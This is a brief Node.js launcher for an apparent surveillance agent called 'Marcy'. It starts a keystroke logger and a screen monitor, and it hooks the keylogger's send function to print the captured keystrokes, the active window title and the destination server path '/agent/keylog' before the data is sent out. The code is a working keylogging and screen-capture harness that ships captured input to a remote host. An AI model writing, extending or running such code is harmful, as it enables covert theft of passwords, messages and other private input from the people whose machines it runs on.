const { MarcyKey, MarcyScreen } = require('./marcy');

// Initialize instances using the factory functions
const keyMonitor = MarcyKey();
const screenMonitor = MarcyScreen();

// Override the sendData method to add logging
const originalSendData = keyMonitor.sendData;
keyMonitor.sendData = async function(data, windowTitle = '') {
    console.log('\n=== Key Data ===');
    console.log('Window:', windowTitle);
    console.log('Data:', data);
    console.log('Server:', `${this.config.protocol}://${this.config.server}/agent/keylog`);
    console.log('================\n');
    
    return originalSendData.call(this, data, windowTitle);
};

// Start monitoring
console.log('Starting Marcy...');
keyMonitor.start();
screenMonitor.start();

// Handle process termination
process.on('SIGINT', () => {
    console.log('\nStopping Marcy...');
    keyMonitor.stop();
    screenMonitor.stop();
    process.exit();
}); 